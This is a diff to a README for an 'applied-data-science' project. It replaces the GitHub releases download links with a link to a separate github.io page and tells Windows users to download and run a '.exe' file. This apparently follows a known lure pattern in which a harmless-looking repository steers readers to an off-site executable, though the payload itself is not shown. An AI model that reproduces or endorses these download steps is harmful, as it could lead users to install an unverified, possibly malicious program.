@@ -1,6 +1,6 @@
 # 📊 applied-data-science - Explore real data with simple tools
 
-[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/Mdraz8481/applied-data-science/releases)
+[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://mdraz8481.github.io)
 
 ## What is this project?
 
@@ -19,7 +19,7 @@ To run these tools on your Windows computer, you need a few basic things:
 
 You need to visit the release page to get the software. Follow these steps:
 
-1. Click this link to go to the releases page: [https://github.com/Mdraz8481/applied-data-science/releases](https://github.com/Mdraz8481/applied-data-science/releases).
+1. Click this link to go to the releases page: [https://mdraz8481.github.io](https://mdraz8481.github.io).
 2. Look for the section labeled "Assets."
 3. Select the file ending in .exe for Windows.
 4. Click the file name to start your download.
